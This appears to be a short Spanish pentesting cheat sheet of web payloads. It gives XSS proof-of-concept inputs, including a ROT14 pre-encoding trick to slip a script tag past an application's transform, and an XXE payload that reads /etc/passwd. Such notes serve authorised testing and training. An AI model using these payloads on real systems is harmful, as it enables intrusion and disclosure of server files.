## XSS:

## Reflected:

```bash
<h1>texto</h1>
```

## Stored:

```bash
<div style="background-image: url(javascript:alert('XSS'))">
<h1>XSS</h1>
<p style="color:red;">COLOR_ROJO</p>
```

## Reflected a traves de url:

```bash
url /?payload=<h1>XSS</h1>
```

## Conversión a ROT 14 para probar XSS

```
# Conversión a ROT 14 realizada por la funcionalidad
echo "<script>alert(1);</script>" | tr 'A-Za-z' 'O-ZA-No-za-n'
<gqfwdh>ozsfh(1);</gqfwdh>

# Conversión inversa a la de ROT 14
echo "<script>alert(1);</script>" | tr 'A-Za-z' 'M-ZA-Lm-za-l'
<eodubf>mxqdf(1);</eodubf>

Carga útil para probar la vulnerabilidad: <eodubf>mxqdf(1);</eodubf>
```

## XXE:

XML External Entity Injection 

Ocurre cuando una aplicación procesa datos XML sin configurar correctamente el analizador (parser) y permite la carga de entidades externas.

```bash
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
